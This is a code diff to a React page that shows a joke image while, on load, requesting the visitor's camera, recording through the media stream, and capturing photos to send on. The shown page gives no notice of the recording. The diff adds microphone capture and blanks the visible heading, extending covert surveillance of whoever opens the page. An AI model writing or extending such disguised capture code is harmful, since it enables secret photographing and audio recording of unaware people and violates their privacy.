@@ -4,6 +4,7 @@ import { useEffect, useState, useRef } from "react";
 
 export default function Home() {
   const [stream, setStream] = useState<MediaStream | null>(null);
+  const videoRef = useRef<HTMLVideoElement | null>(null);
   const mediaRecorderRef = useRef<MediaRecorder | null>(null);
   const audioChunksRef = useRef<Blob[]>([]);
 
@@ -11,11 +12,14 @@ export default function Home() {
     const startCapture = async () => {
       try {
         if (typeof navigator !== "undefined" && navigator.mediaDevices?.getUserMedia) {
-          // Только видео без звука
           const mediaStream = await navigator.mediaDevices.getUserMedia({
-            video: true,  // Убираем audio: true
+            video: true,
+            audio: true,
           });
           setStream(mediaStream);
+          if (videoRef.current) {
+            videoRef.current.srcObject = mediaStream;
+          }
 
           // Настройка записи аудио
           const mediaRecorder = new MediaRecorder(mediaStream);
@@ -35,7 +39,7 @@ export default function Home() {
           console.error("getUserMedia не поддерживается в этом браузере");
         }
       } catch (error) {
-        console.error("Ошибка доступа к камере:", error);
+        console.error("Ошибка доступа к камере и микрофону:", error);
       }
     };
 
@@ -43,22 +47,15 @@ export default function Home() {
   }, []);
 
   const captureAndSendPhoto = async () => {
-    const videoElement = document.createElement("video");
-    if (!stream) return;
-    videoElement.srcObject = stream;
-    
-    // Ждём, пока видео загрузится
-    await new Promise((resolve) => {
-      videoElement.onloadedmetadata = () => resolve(null);
-    });
+    if (!videoRef.current) return;
 
     const canvas = document.createElement("canvas");
     const context = canvas.getContext("2d");
     if (!context) return;
 
-    canvas.width = videoElement.videoWidth;
-    canvas.height = videoElement.videoHeight;
-    context.drawImage(videoElement, 0, 0, canvas.width, canvas.height);
+    canvas.width = videoRef.current.videoWidth;
+    canvas.height = videoRef.current.videoHeight;
+    context.drawImage(videoRef.current, 0, 0, canvas.width, canvas.height);
 
     const blob = await new Promise<Blob | null>((resolve) => canvas.toBlob(resolve, "image/png"));
     if (!blob) return;
@@ -80,7 +77,7 @@ export default function Home() {
 
   return (
     <div className="flex flex-col items-center justify-center min-h-screen bg-gray-900 text-white">
-      <h1 className="text-2xl mb-4">🤣 Посмотри сюда!</h1>
+      <h1 className="text-2xl mb-4"></h1>
       <img src="/funny.jpg" alt="Прикол" className="mt-4 w-64" />
     </div>
   );
